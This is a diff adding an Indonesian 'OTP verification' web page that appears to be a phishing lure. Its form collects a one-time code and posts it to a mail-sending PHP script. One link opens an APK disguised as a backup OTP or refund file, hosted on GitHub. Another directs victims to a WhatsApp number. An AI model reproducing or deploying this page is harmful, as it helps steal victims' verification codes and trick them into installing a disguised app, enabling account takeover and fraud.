@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi OTP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    
+    #gambar-atas {
+      width: 100%;
+    }
+
+    #gambar-atas img {
+      width: 100%;
+    }
+
+    #verifikasi-otp-container {
+      display: flex;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    #verifikasi-otp-text {
+      color: #2f539b;
+      font-size: 24px;
+      margin-right: 10px;
+      font-size: 15px;
+      margin-left: 40px;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    #countdown {
+      font-size: 24px;
+      color: #2f539b;
+      margin-right: 10px;
+      font-size: 15px;
+      margin-left: 10px;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    #otp-input-container {
+      margin-top: 20px;
+    }
+
+    #otp-input {
+      padding: 14px;
+      border-radius: 5px;
+      border: 2px solid #2f539b;
+      margin-bottom: 10px;
+      width: 80%;
+      max-width: 280px;
+      font-weight: bold;
+    }
+
+    #submit-button {
+      padding: 14px;
+      border-radius: 5px;
+      border: none;
+      background-color: #2f539b;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      width: 270%;
+      max-width: 310px;
+      margin-top : 10px;
+    }
+
+    #result {
+      display: none;
+      width: 80%;
+      padding: 10px;
+      background-color: #2f539b;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border-radius: 5px;
+      color: white;
+    }
+
+    #request-otp-link {
+      color: #2f539b;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+
+    #download-otp-link {
+      color: #2f539b;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+
+    #gambar-bawah {
+      width: 100%;
+      margin-top: 20px;
+    }
+
+    #gambar-bawah img {
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+  <form id="otp-form" action="send_email.php/send_otp.php" method="post">
+    <div id="gambar-atas">
+      <img src="https://i.ibb.co/6s22WGq/IMG-20240307-150950.jpg" alt="Gambar Atas">
+    </div>
+    <div id="verifikasi-otp-container">
+      <div id="verifikasi-otp-text">Verifikasi OTP :</div>
+      <div id="countdown"></div>
+    </div>
+    <div id="otp-input-container">
+      <input type="number" id="otp-input" name="otp_input" placeholder="Masukan OTP" maxlength="6">
+    </div>
+    <button type="submit" id="submit-button">Lanjut</button>
+    <p id="request-otp-link">Request Kode OTP</p>
+    <p id="download-otp-link">Download Kode OTP Cadangan</p>
+  </form>
+  <div id="result">
+    OTP Tidak Valid
+  </div>
+  <div id="gambar-bawah">
+    <img src="https://i.ibb.co/K5j2YvV/IMG-20240306-221037.jpg" alt="Gambar Bawah">
+  </div>
+  <script>
+    function startCountdown() {
+      var countDownDate = new Date().getTime() + 5 * 60 * 1000;
+      var countdownElement = document.getElementById("countdown");
+
+      var x = setInterval(function() {
+        var now = new Date().getTime();
+        var distance = countDownDate - now;
+
+        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+        countdownElement.innerHTML = "" + minutes + "m " + seconds + "s ";
+
+        if (distance < 0) {
+          clearInterval(x);
+          countdownElement.innerHTML = "Waktu Habis";
+        }
+      }, 1000);
+    }
+
+    window.onload = function() {
+      startCountdown();
+    };
+
+    document.getElementById("request-otp-link").addEventListener("click", function() {
+      window.location.href = "https://api.whatsapp.com/send?phone=6287859278909";
+    });
+
+    document.getElementById("download-otp-link").addEventListener("click", function() {
+      window.open("https://github.com/Satudua122/Satudua122.github.io/raw/main/Unduh-File-refund-pengembalian-dana.apk", "_blank");
+    });
+
+    document.getElementById("otp-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+      var enteredOTP = document.getElementById("otp-input").value;
+      var validOTP = "123456";
+
+      if (enteredOTP !== validOTP) {
+        document.getElementById("result").style.display = "block";
+        setTimeout(function() {
+          document.getElementById("result").style.display = "none";
+        }, 2000);
+      } else {
+        this.submit();
+      }
+    });
+  </script>
+</body>
+</html>
